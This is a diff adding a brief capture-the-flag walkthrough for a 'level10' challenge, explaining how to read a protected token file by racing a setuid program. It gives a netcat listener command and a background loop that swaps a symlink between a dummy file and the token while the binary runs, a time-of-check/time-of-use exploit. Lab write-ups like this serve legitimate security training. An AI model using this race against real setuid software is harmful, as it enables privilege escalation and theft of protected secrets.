@@ -1,0 +1,11 @@
+as the executable explains try to send a file to a server on port 6969
+
+create a server on that port with a local ip using nc
+nc -l 127.0.2.1 6969
+
+now as it doesnt let you send token, a good workaround is create a background process that sends a dummy file b and once is running create a loop that change all time b file between dummy file and token softlink,
+like this is very probable the executable takes b as a dummy file and sends just when it has change to be a simlink >:D
+
+touch dummy1
+(while 1; do ln -s ./dummy1 b; ln -s ./token b; done) &
+level10 b (execute this very fast, or in a loop)
